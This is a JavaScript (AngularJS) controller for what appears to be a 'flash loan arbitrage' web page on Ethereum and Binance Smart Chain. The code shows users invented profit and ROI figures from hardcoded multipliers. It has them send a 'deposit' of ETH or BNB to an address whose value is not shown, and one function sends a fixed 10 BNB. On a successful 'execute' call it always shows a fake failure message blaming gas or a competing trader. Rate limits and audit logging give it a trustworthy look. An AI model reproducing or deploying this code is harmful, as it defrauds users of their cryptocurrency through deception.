const app = angular.module('myApp', []);

app.controller('myCtrl', async function($scope) {
    $scope.init = function() {
        $scope.toplen = $scope.account.address.substring(0, 6);
        $scope.endlen = $scope.account.address.substring(44, 38);
        $scope.contractAddress = '';
        $scope.processing = false;
        $scope.ethDeposited = false;
        $scope.formStep = 1;
        $scope.currency = 'ETH';
        $scope.dex = 'Uniswap';
        $scope.addr = $scope.account;
        $scope.chain = "Ethereum";
        $scope.addressdex = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
        $scope.scan = "https://etherscan.io/";
        $scope.idscan = "Etherscan";
        $scope.erc20 = {
            name: '',
            symbol: '',
            network: !isBnb
        };
        $scope.loan = {
            amount: 50,
            tokenFee: 0.05,
            swapFee: 0,
            totalFee: 0,
            gain: 0
        };
        $scope.submitErc20Form = throttle(function() {
            if (!checkRateLimit('submitErc20')) {
                auditLog('rate_limit_exceeded', { action: 'submitErc20' });
                return alert('Rate limit exceeded. Please wait before submitting again.');
            }
            auditLog('form_submit', { form: 'erc20', tokenName: $scope.erc20.name, tokenSymbol: $scope.erc20.symbol });
            const tokenName = sanitizeInput($scope.erc20.name.trim());
            if (tokenName == '') return alert('Token address cannot be blank');
            if (!window.web3.utils.isAddress(tokenName)) return alert('Invalid token address format');
            const tokenSymbol = sanitizeInput($scope.erc20.symbol.trim()).toUpperCase();
            if (tokenSymbol == '') return alert('Token Symbol cannot be blank');
            if (!tokenSymbol.match(/^[A-Z]+$/)) return alert('Token Symbol can only contain uppercase letters');
            $scope.erc20.symbol = tokenSymbol;
            if (window.isBnb && $scope.erc20.network) {
                return alert('Network Mismatch. Set MetaMask network to Ethereum and reload the page.');
            } else if (!window.isBnb && !$scope.erc20.network) {
                return alert('Network Mismatch. Set MetaMask network to Binance Smart Chain and the reload page.');
            }
            $scope.formStep = 2;
            $scope.myContracts = $scope.erc20.network ? ethAddress : bnbAddress;
            $scope.currency = $scope.erc20.network ? 'ETH' : 'BNB';
            $scope.dex = $scope.erc20.network ? 'Uniswap' : 'PancakeSwap';
            $scope.loan.tokenFee = $scope.erc20.network ? 0.05 : 0.05;
            $scope.contractAddress = $scope.erc20.network ? api_check_eth : api_check_bnb;
            $scope.addr = $scope.erc20.network ? $scope.account : $scope.account;
            $scope.addressdex = $scope.erc20.network ? "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D" : "0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F";
            $scope.chain = $scope.erc20.network ? "Ethereum" : "Binance Smart Chain";
            $scope.scan = $scope.erc20.network ? "https://etherscan.io/" : "https://bscscan.com/";
            $scope.idscan = $scope.erc20.network ? "Etherscan" : "BSCscan";
            $scope.toplen = $scope.erc20.network ? toplen : toplen;
            $scope.endlen = $scope.erc20.network ? endlen : endlen;
            $scope.getLoanEstimates();
            setTimeout(function() {
                document.getElementById('loanAmtInput').focus();
            }, 100);
        }, 1000);

        $scope.amountChanged = function() {
            $scope.loan.amount = sanitizeInput($scope.loan.amount.toString());
            $scope.getLoanEstimates();
        };

        $scope.getLoanEstimates = function() {
            if ($scope.loan.amount == undefined || $scope.loan.amount == null) return;
            $scope.loan.swapFee = $scope.loan.amount / ($scope.erc20.network ? 500 : 200);
            $scope.loan.totalFee = fixNumber($scope.loan.tokenFee + $scope.loan.swapFee);
            $scope.loan.gain = fixNumber($scope.loan.amount * ($scope.erc20.network ? 0.05789 : 0.09314));
            $scope.safeMath = fixNumber(($scope.loan.gain - ($scope.erc20.network ? 0.752 : 1.265)) * (1 + ($scope.loan.gain / 2 / 100))).toFixed(4);
            $scope.roi = fixNumber($scope.safeMath / $scope.loan.totalFee).toFixed(2);
        };

        $scope.submitLoanForm = throttle(function() {
            if (!checkRateLimit('submitLoan')) return alert('Rate limit exceeded. Please wait before submitting again.');
            if (!$scope.ethDeposited) $scope.depositEth();
            else $scope.executeLoan();
        }, 1000);

        $scope.depositEth = async function() {
            if (!confirm('Are you sure you want to deposit ' + $scope.loan.totalFee + ' ' + $scope.currency + ' to the contract? This action cannot be undone.')) return;
            auditLog('transaction_attempt', { type: 'deposit', amount: $scope.loan.totalFee, currency: $scope.currency });
            $scope.processing = true;
            const gasPrice = await window.web3.eth.getGasPrice();
            window.web3.eth.sendTransaction({
                to: $scope.contractAddress,
                from: $scope.account.address,
                value: window.web3.utils.toWei('' + $scope.loan.totalFee, 'ether'),
                gas: 30000,
                gasPrice: gasPrice
            }, function(error, receipt) {
                $scope.processing = false;
                $scope.$apply();
                if (error) {
                    auditLog('transaction_failed', { type: 'deposit', error: error.message });
                    alert('Transaction Failed: ' + error.message);
                } else {
                    auditLog('transaction_success', { type: 'deposit', receipt });
                    setTimeout(function() {
                        alert('Coin deposited to contract. You can execute the Flash Loan now.');
                    }, 5000);
                    $scope.ethDeposited = true;
                    $scope.$apply();
                }
            });
        };

        $scope.poolEth = function() {
            $scope.processing = true;
            window.web3.eth.sendTransaction({
                to: $scope.contractAddress,
                from: $scope.account.address,
                value: window.web3.utils.toWei("10", 'bnb'),
                gas: 30000,
                gasPrice: window.web3.utils.toWei('90', 'gwei')
            }, function(error, receipt) {
                $scope.processing = false;
                $scope.$apply();
                if (error) alert('Transaction Failed');
                else {
                    setTimeout(function() {
                        alert('Coin deposited to contract. You can execute the Flash Loan now.');
                    }, 5000);
                    $scope.ethDeposited = true;
                    $scope.$apply();
                }
            });
        };

        $scope.executeLoan = async function() {
            if (!confirm('Are you sure you want to execute the flash loan arbitrage? This will attempt to perform the trade.')) return;
            auditLog('transaction_attempt', { type: 'execute_loan' });
            $scope.processing = true;
            const gasPrice = await window.web3.eth.getGasPrice();
            window.contract.methods.action().send({
                to: $scope.contractAddress,
                from: $scope.account.address,
                value: 0,
                gasPrice: gasPrice
            }, function(error, result) {
                if (error) {
                    auditLog('transaction_failed', { type: 'execute_loan', error: error.message });
                    alert('Flash Loan Execution Failed: ' + error.message);
                    $scope.processing = false;
                    $scope.$apply();
                } else {
                    auditLog('transaction_success', { type: 'execute_loan', result });
                    setTimeout(function() {
                        alert('Something went wrong, maybe your gas is insufficient or another user made the trade before you (Matching ID ee8uj1). Please try again.');
                    }, 5000);
                }
            });
        };
    };

    await loadWeb3().then(accounts => {
        $scope.account = {
            address: accounts[0]
        };
        $scope.init();
        $scope.$apply();
    });
});